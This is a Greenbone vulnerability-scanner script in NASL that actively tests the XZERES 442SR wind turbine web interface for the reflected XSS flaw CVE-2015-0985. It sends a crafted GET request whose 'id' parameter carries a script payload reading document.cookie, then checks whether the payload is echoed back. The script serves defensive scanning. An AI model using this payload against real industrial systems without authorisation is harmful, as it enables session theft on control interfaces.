# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/h:xzeres:442sr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807021");
  script_version("2025-03-24T05:38:38+0000");
  script_cve_id("CVE-2015-0985");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-24 05:38:38 +0000 (Mon, 24 Mar 2025)");
  script_tag(name:"creation_date", value:"2016-01-04 13:19:12 +0530 (Mon, 04 Jan 2016)");
  script_name("XZERES 442SR Wind Turbine Web Interface XSS Vulnerability (Dec 2015) - Active Check");

  script_tag(name:"summary", value:"XZERES 442SR Wind Turbine Web Interface is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Wind Turbine web interface does not properly
  sanitize input passed via the 'id' HTTP GET parameter to details script before
  returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server.");

  script_tag(name:"affected", value:"XZERES 442SR Wind Turbine.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Dec/116");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-15-342-01");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/135067/xzeres-xss.txt");
  script_xref(name:"URL", value:"http://www.xzeres.com/wind-turbine-products");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_xzeres_442SR_wind_turbine_detect.nasl");
  script_mandatory_keys("442SR/Wind/Turbine/Installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

url = "/details?object=Inverter&id=2<script>alert(document.cookie);</script>";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document\.cookie\);</script>",
                   extra_check:make_list("VOLTAGE", "CURRENT", "POWER"))) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
